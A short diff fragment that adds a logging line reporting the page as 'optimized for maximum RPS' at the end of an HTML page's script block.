+        log('[PERFORMANCE] Optimized for maximum RPS', 'info');
     </script>
 </body>
 </html>
